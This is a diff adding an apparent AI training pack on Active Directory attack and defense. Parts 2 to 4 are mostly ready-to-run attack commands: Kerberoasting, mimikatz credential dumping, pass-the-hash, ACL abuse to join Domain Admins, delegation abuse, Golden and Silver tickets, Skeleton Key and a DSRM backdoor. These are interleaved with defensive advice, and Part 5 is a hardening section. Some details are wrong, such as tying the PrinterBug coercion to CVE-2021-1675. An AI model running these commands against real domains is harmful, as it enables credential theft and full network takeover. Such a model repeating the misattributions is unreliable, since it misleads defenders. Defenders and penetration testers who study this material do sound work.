@@ -1,0 +1,387 @@
+================================================================================
+TITAN AI — TRAINING PACK 010: ACTIVE DIRECTORY ATTACKS AND DEFENSE
+KERBEROS INTERNALS, PRIVILEGE ESCALATION, LATERAL MOVEMENT, PERSISTENCE
+================================================================================
+
+================================================================================
+PART 1: ACTIVE DIRECTORY FUNDAMENTALS
+================================================================================
+
+--- WHY AD IS THE MOST ATTACKED THING IN ENTERPRISE ---
+
+Active Directory is the identity backbone of 95% of Fortune 500 companies.
+Control AD = control everything. Domain Admin = God of the network.
+A single compromised user account is the start. Domain Admin is the finish.
+The path between them is the study of this entire document.
+
+AD STRUCTURE:
+  Forest → Domain Tree → Domain → Organizational Unit (OU) → Objects
+  
+  Objects: Users, Computers, Groups, GPOs, Service Accounts
+  
+  Trust relationships: Domains in a forest trust each other by default.
+  If you compromise Domain A and there's a trust to Domain B:
+  B's resources are accessible. Forest trust = total access.
+
+THE KERBEROS AUTHENTICATION FLOW (know this cold):
+
+1. Client → KDC (Key Distribution Center): Authentication Service Request (AS-REQ)
+   Contains: Username, timestamp encrypted with client's secret key (password hash)
+   
+2. KDC → Client: AS-REP
+   Contains: TGT (Ticket Granting Ticket) encrypted with krbtgt secret
+   Also contains: Session key encrypted with client's secret key
+   
+3. Client → KDC: Ticket Granting Service Request (TGS-REQ)
+   Contains: TGT + service name requested
+   
+4. KDC → Client: TGS-REP
+   Contains: Service Ticket encrypted with target service's secret key
+   
+5. Client → Service: Application Request (AP-REQ)
+   Contains: Service Ticket
+   
+6. Service verifies ticket (using its own secret key), grants access
+
+ATTACK IMPLICATIONS AT EACH STEP:
+  Step 2: AS-REP Roasting — request AS-REP for users without preauth enabled
+  Steps 3-4: Kerberoasting — request service tickets for SPNs, crack offline
+  Steps 4-5: Pass-the-Ticket — steal tickets from memory, replay them
+  Step 2: Golden Ticket — forge TGTs using krbtgt hash (domain persistence)
+  Step 4: Silver Ticket — forge service tickets using service account hash
+
+================================================================================
+PART 2: CREDENTIAL ATTACKS
+================================================================================
+
+--- KERBEROASTING (deep technical) ---
+
+WHY IT WORKS:
+  Any domain user can request a service ticket for any service account with an SPN.
+  The service ticket is encrypted with the service account's NTLM password hash.
+  This ticket can be extracted from memory and cracked offline.
+  Service accounts often have weak passwords (set once, never changed).
+  Common service accounts: mssql_svc, exchange_service, backup_admin
+
+ATTACK EXECUTION:
+  # Enumerate SPNs (service accounts with registered services)
+  GetUserSPNs.py -request -dc-ip 192.168.1.1 domain.local/jdoe:Password123
+  
+  Or with PowerView:
+  Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
+  
+  # Request ticket (any domain user can do this — legitimate Kerberos operation)
+  GetUserSPNs.py -dc-ip 192.168.1.1 domain.local/jdoe:Password123 \
+    -request-user mssql_svc -output hash.txt
+  
+  # Crack the hash offline (not on target network)
+  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
+  hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+  # Service accounts with weak passwords crack in minutes to hours
+
+DEFENSE:
+  - All service accounts must have 25+ character random passwords
+  - Use Group Managed Service Accounts (gMSA) — AD manages 256-char password, rotates automatically
+  - Monitor: TGS requests for multiple different SPNs in short time window (unusual)
+  - Alert: Any account requesting service tickets for many different services
+  - Use AES encryption for Kerberos (RC4 is easier to crack — RC4 hash = faster hashcat)
+
+--- AS-REP ROASTING ---
+
+ATTACK:
+  Some accounts have "Do not require Kerberos preauthentication" set.
+  These accounts will give you their AS-REP (including their hash) without password.
+  
+  # Find vulnerable accounts
+  GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.1.1 -no-pass
+  
+  # Output: $krb5asrep$23$user@domain.local:...  (hashcat mode 18200)
+  hashcat -m 18200 asrep_hashes.txt rockyou.txt
+
+DEFENSE: Never enable "Do not require Kerberos preauthentication" (almost never needed).
+Alert on AS-REQ requests without preauthentication field.
+
+--- PASS-THE-HASH (NTLM) ---
+
+ATTACK:
+  If you have an NTLM hash, you don't need the plaintext password.
+  NTLM authentication uses the hash directly.
+  
+  # Dump hashes from compromised machine
+  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+  # Gets: Username, Domain, NTLM hash, Kerberos tickets in memory
+  
+  # Use hash to authenticate without cracking
+  psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
+    domain/Administrator@192.168.1.50
+  
+  crackmapexec smb 192.168.1.0/24 -u Administrator \
+    -H 31d6cfe0d16ae931b73c59d7e0c089c0 --local-auth
+  # Tests hash against all machines in subnet — shows which it works on
+
+DEFENSE:
+  - Enable Protected Users security group (disables NTLM for members)
+  - Disable NTLM where possible (Kerberos only)
+  - Credential Guard: Protects LSASS from memory reading via virtualization
+  - Local Administrator Password Solution (LAPS): Unique password per machine
+    → PtH with local admin no longer gives access to all machines (each has different hash)
+  - Privileged Access Workstations (PAW): Never let admin credentials touch regular workstations
+
+--- PASS-THE-TICKET ---
+
+ATTACK:
+  # Export Kerberos tickets from memory
+  mimikatz.exe "kerberos::list /export"
+  # Creates .kirbi files for each ticket
+  
+  # Import ticket on attacker machine
+  mimikatz.exe "kerberos::ptt administrator@cifs-fileserver.kirbi"
+  
+  # Now access resources as that user without password
+  dir \\fileserver\C$    # Works because ticket is in memory
+
+DEFENSE:
+  - Monitor for tickets being used from unusual source IPs
+  - Kerberos ticket IP validation (RFC 6113) — mitigates ticket reuse from different IP
+  - Privileged account session monitoring
+
+================================================================================
+PART 3: PRIVILEGE ESCALATION IN AD
+================================================================================
+
+--- ACLS AND MISCONFIGURED PERMISSIONS (MOST COMMON REAL-WORLD PATH) ---
+
+CONCEPT:
+  Active Directory objects have Access Control Lists.
+  Misconfigured ACLs are the most common privilege escalation path in real environments.
+  Not CVEs. Not zero-days. Wrong permissions on AD objects.
+
+DANGEROUS ACL PERMISSIONS TO LOOK FOR:
+
+GenericAll on User: You can change their password, add them to groups, etc.
+  # Abuse:
+  net user targetuser NewPassword123! /domain  
+  # Or: Add yourself to a privileged group
+  Add-ADGroupMember -Identity "Domain Admins" -Members "attacker"
+
+WriteDACL: Lets you write to the ACL — give yourself any other permission
+  # Abuse: Give yourself GenericAll, then exploit that
+  Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker \
+    -Rights GenericAll
+
+WriteOwner: Set yourself as owner → owners can modify ACL
+  Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity attacker
+  # Then: Add WriteDACL, then GenericAll, then add to group
+
+ForceChangePassword: Change target's password without knowing current
+  $pass = ConvertTo-SecureString "NewPass@123" -AsPlainText -Force
+  Set-DomainUserPassword -Identity targetuser -AccountPassword $pass
+
+DISCOVERY TOOLS:
+  # BloodHound — maps entire AD attack paths visually
+  SharpHound.exe -c All  # Collect all AD data
+  # Import to BloodHound UI
+  # Query: "Shortest path to Domain Admins from owned user"
+  # BloodHound literally draws the path with exploitation steps
+  
+  This is why BloodHound changed red teaming: Previously finding these paths took days.
+  BloodHound finds them in minutes from any domain user perspective.
+
+BLOODHOUND DANGEROUS QUERIES:
+  "Find all users with DCSync rights"
+  "Shortest paths to Domain Admin"  
+  "Find computers where Domain Admins are logged in"
+  "Find machines with unconstrained delegation"
+  "Find AS-REP Roastable users"
+
+--- DELEGATION ATTACKS ---
+
+UNCONSTRAINED DELEGATION:
+  Some machines are trusted to delegate authentication on behalf of any user.
+  When a domain admin authenticates to that machine, their TGT is stored on it.
+  
+  # Find machines with unconstrained delegation
+  Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+  
+  # Wait for privileged user to authenticate to the machine, then:
+  mimikatz.exe "sekurlsa::tickets /export"
+  # Extract DA TGT, import on attacker machine, access DC
+  
+  Forced authentication trick (PrinterBug):
+  # Coerce DC to authenticate TO the unconstrained delegation machine
+  SpoolSample.exe DC01 WebServer01  # Using print spooler bug (CVE-2021-1675)
+  # DC01 sends TGT to WebServer01
+  # Dump TGT from WebServer01 memory
+  # Now have DC01's TGT → DCSync possible
+
+CONSTRAINED DELEGATION:
+  More limited: Service A can only delegate to specific service B.
+  Still exploitable if you compromise service A's account.
+  
+  # With service A's hash, forge ticket to service B
+  getST.py -spn cifs/DC01.domain.local -impersonate administrator \
+    domain.local/serviceA -hashes :serviceA_ntlm_hash
+  export KRB5CCNAME=administrator.ccache
+  psexec.py -k -no-pass administrator@DC01.domain.local
+
+RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) — common modern attack:
+  If you have WriteProperty on a computer object, you can configure RBCD.
+  Create a fake computer account, configure RBCD on target.
+  Impersonate any user to the target.
+  
+  # Create fake computer (any domain user can by default — MachineAccountQuota=10)
+  addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass123' \
+    domain.local/lowpriv:password
+  
+  # Configure RBCD on target computer to trust FAKE01$
+  rbcd.py -action write -delegate-to 'TargetComputer$' \
+    -delegate-from 'FAKE01$' domain.local/user_with_writeproperty:password
+  
+  # Get service ticket for Administrator on target
+  getST.py -spn cifs/TargetComputer.domain.local \
+    -impersonate Administrator domain.local/'FAKE01$':FakePass123
+  
+  Result: Admin access to TargetComputer without any credentials from it.
+
+================================================================================
+PART 4: DOMAIN PERSISTENCE
+================================================================================
+
+--- GOLDEN TICKET ---
+
+WHAT IT IS:
+  krbtgt is the service account that signs all TGTs in the domain.
+  If you have krbtgt's NTLM hash, you can forge ANY TGT.
+  Forged TGT = Golden Ticket.
+  Persistence: Even if all user passwords are reset, Golden Ticket still works.
+  
+  CAVEAT: If krbtgt password is reset TWICE (not once), golden tickets are invalidated.
+
+EXECUTION:
+  # Step 1: Get krbtgt hash (requires DA or DCSync rights)
+  mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
+  # Output: Hash : a87f3a...  (save this)
+  
+  # Step 2: Get domain SID
+  whoami /user  → domain SID is prefix of SID before last -XXXX
+  
+  # Step 3: Forge Golden Ticket
+  mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local \
+    /sid:S-1-5-21-XXXXXXXXXX /krbtgt:NTLM_HASH /id:500 /ptt"
+  
+  # Result: Ticket injected into memory
+  dir \\DC01\C$  # Should work — you are now "Administrator" in Kerberos
+
+DEFENSE:
+  - Enable ATA/Defender for Identity: Detects forged tickets (improbable PAC, unusual attributes)
+  - Reset krbtgt password TWICE (once breaks existing sessions, second invalidates golden tickets)
+  - Privileged Access Workstations — golden tickets created on compromised machines
+
+--- SILVER TICKET ---
+
+WHAT IT IS:
+  Service-specific forged ticket. Requires service account hash (not krbtgt).
+  Less powerful than golden (only works for one service).
+  But: NEVER touches DC (no network traffic to DC for validation).
+  
+  Impact: Covert persistence. Harder to detect. Access to specific service as any user.
+  Common target: CIFS (file access), HOST (PSExec), MSSQL, HTTP
+
+EXECUTION:
+  mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local \
+    /sid:S-1-5-21-XXXXXXXXXX /target:fileserver01.domain.local \
+    /service:cifs /rc4:SERVICE_NTLM_HASH /id:500 /ptt"
+  dir \\fileserver01\C$   # Works without touching DC
+
+--- SKELETON KEY ---
+
+WHAT IT IS:
+  Patches LSASS in memory on the DC.
+  Creates a master password that works for EVERY account without changing their passwords.
+  
+  mimikatz.exe "privilege::debug" "misc::skeleton"
+  # Now every account can authenticate with password "mimikatz"
+  # But their real password still works too
+  
+  CAVEAT: In-memory only. Disappears on DC reboot.
+  For persistence: Must re-run after every reboot (requires access to DC).
+  
+  DETECTION: LSASS process integrity check. Defender for Identity: Skeleton Key alert.
+
+--- DSRM (DIRECTORY SERVICES RESTORE MODE) ---
+
+WHAT IT IS:
+  Every DC has a local admin (DSRM admin) for disaster recovery.
+  If you can set the DSRM password, you have persistent local admin on every DC.
+  DSRM account can be configured to authenticate remotely.
+  
+  # Set DSRM password (requires DA)
+  ntdsutil
+  set dsrm password
+  reset password on server dc01.domain.local
+  [enter new password]
+  
+  # Enable remote DSRM logon
+  reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
+  
+  # Connect to DC as DSRM admin
+  psexec.py -hashes :DSRM_NTLM_HASH domain/Administrator@DC01
+
+================================================================================
+PART 5: DEFENSE — ACTIVE DIRECTORY HARDENING
+================================================================================
+
+PRIVILEGED IDENTITY MANAGEMENT:
+  Tier 0: Domain controllers, AD infrastructure → Admin accounts used ONLY from PAWs
+  Tier 1: Server infrastructure → Admin accounts used ONLY from Tier 1 management machines
+  Tier 2: User workstations → Admin accounts used ONLY from Tier 2 management machines
+  
+  Separation rule: Tier 0 admin NEVER logs onto Tier 1 or Tier 2 machines.
+  Why: If attacker compromises a workstation (Tier 2) and DA is logged in:
+       LSASS has DA credentials. Game over. Tiering prevents this credential exposure.
+
+TECHNICAL CONTROLS:
+  # Credential Guard (Windows 10+): Isolates LSASS in virtualized environment
+  Enable: Group Policy → System Guard / Virtualization Based Security
+  Effect: Mimikatz cannot read NTLM hashes or Kerberos keys from LSASS
+  
+  # Protected Users Security Group:
+  Add: All privileged accounts (DA, EA, Schema Admin)
+  Effect:
+    - No NTLM authentication (Kerberos only)
+    - No DES or RC4 Kerberos (AES only)
+    - No unconstrained delegation
+    - No credential caching (can't pass-the-hash or extract from LSASS)
+    - TGT lifetime maximum 4 hours
+  
+  # LAPS (Local Administrator Password Solution):
+  Requirement: Unique local admin password per workstation
+  Eliminates: Pass-the-hash lateral movement using local admin
+  
+  # MachineAccountQuota = 0:
+  Prevents regular users from creating computer accounts (blocks RBCD attack)
+  set-ADDomain -Identity domain.local -Replace @{"ms-ds-MachineAccountQuota"="0"}
+
+AD MONITORING — HIGH-VALUE EVENTS TO ALERT ON:
+  
+  Event ID 4625: Failed logon (alert on spikes)
+  Event ID 4648: Explicit credentials used (PtH indicator)
+  Event ID 4672: Special privileges assigned at logon (admin logon)
+  Event ID 4768: Kerberos TGT requested (baseline, alert on unusual patterns)
+  Event ID 4769: Kerberos Service Ticket requested (Kerberoasting = many at once)
+  Event ID 4771: Kerberos pre-authentication failed
+  Event ID 5136: AD object modified (monitor for privilege changes)
+  Event ID 4662: AD object accessed (DCSync = large number of replication operations)
+  
+  DCSync detection specifically:
+  Monitor for: Event 4662 with GUID {1131f6ad-...} (Replicating Directory Changes)
+  AND source not from Domain Controllers
+  = Attacker is using DCSync from non-DC machine
+
+================================================================================
+END OF PACK 010: ACTIVE DIRECTORY ATTACKS AND DEFENSE
+Total: Kerberos flow and attack mapping, Kerberoasting/AS-REP Roasting deep,
+Pass-the-Hash/Ticket, BloodHound workflow, ACL abuse, delegation attacks
+(unconstrained/constrained/RBCD), Golden Ticket/Silver Ticket/Skeleton Key/DSRM
+persistence, AD hardening tiering model, Credential Guard, LAPS, event monitoring.
+================================================================================
